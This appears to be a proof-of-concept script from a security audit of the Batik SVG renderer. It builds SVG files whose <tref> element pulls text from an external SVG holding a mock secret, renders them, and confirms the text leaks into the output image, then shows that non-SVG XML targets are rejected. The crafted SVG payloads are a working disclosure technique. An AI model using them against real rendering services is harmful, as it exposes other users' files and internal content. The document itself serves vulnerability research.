#!/usr/bin/env bash
# F-9 — <tref> renders external referenced TEXT into the output (non-blind), unlike <image> (blind).
# This makes the SSRF/LFI cluster (F-1/F-6) NON-BLIND — for targets Batik parses as SVG.
#
# SCOPE CORRECTION (per second-opinion review): external tref targets must parse as an SVG document
# (SVG root). Ordinary XML / configuration / SOAP / WSDL roots are REJECTED by the SVG document factory,
# so this is NOT arbitrary-XML disclosure — it discloses the text of external *SVG documents* (e.g. other
# users' uploaded SVGs, an internal SVG-serving endpoint). It is an amplifier of F-1/F-6, not a broad new
# class. Severity: Medium (constrained non-blind disclosure of SVG-parseable content).
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*"):$LAB"

# external SVG-root target holding a "secret" in a text element
cat > tgs.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg"><text id="leak">SECRETcredPASSWORD_9f3a</text></svg>
SVG
# SVG that pulls the external text via <tref>
cat > trefs.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="60"><rect width="400" height="60" fill="white"/><text x="4" y="40" font-size="28" fill="black"><tref xlink:href="tgs.svg#leak"/></text></svg>
SVG
# a non-SVG XML target (rejected -> demonstrates the SVG-root constraint)
cat > tg_xml.xml <<'XML'
<?xml version="1.0"?><configuration><leak id="leak">this-is-not-svg</leak></configuration>
XML
cat > trefx.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="60"><text x="4" y="40" font-size="28" fill="black"><tref xlink:href="tg_xml.xml#leak"/></text></svg>
SVG
cat > TrefSig.java <<'JAVA'
import javax.imageio.ImageIO; import java.io.File; import java.awt.image.BufferedImage;
public class TrefSig { public static void main(String[] a) throws Exception {
  BufferedImage i = ImageIO.read(new File(a[0])); if (i==null){System.out.println(a[0]+" NULL");return;}
  int d=0; for(int y=0;y<i.getHeight();y++) for(int x=0;x<i.getWidth();x++){int c=i.getRGB(x,y);
    if(((c>>16)&255)<80&&((c>>8)&255)<80&&(c&255)<80)d++;}
  System.out.println(a[0]+" text_pixels="+d+"  ("+(d>0?"external text RENDERED = non-blind disclosure":"blank")+")"); } }
JAVA
javac -cp "$CP" TrefSig.java
echo "== [1] SVG-root target: <tref file:...#leak> under file: doc -> external text rendered into output =="
java -cp "$CP" BatikProbe "$LAB/trefs.svg" "file:$LAB/trefs.svg" "$LAB/tref_ok.png" 2>&1 | grep -iE "TRANSCODE|CAUSE" | head -1
java -cp "$CP" TrefSig "$LAB/tref_ok.png"
echo "== [2] non-SVG XML target -> REJECTED (SVG-root constraint; NOT arbitrary XML) =="
java -cp "$CP" BatikProbe "$LAB/trefx.svg" "file:$LAB/trefx.svg" "$LAB/tref_x.png" 2>&1 | grep -iE "TRANSCODE|prolog|not allowed|CAUSE" | head -2
echo "EXPECT: [1] text_pixels>0 (SVG target disclosed), [2] parse error / no disclosure (non-SVG rejected)."
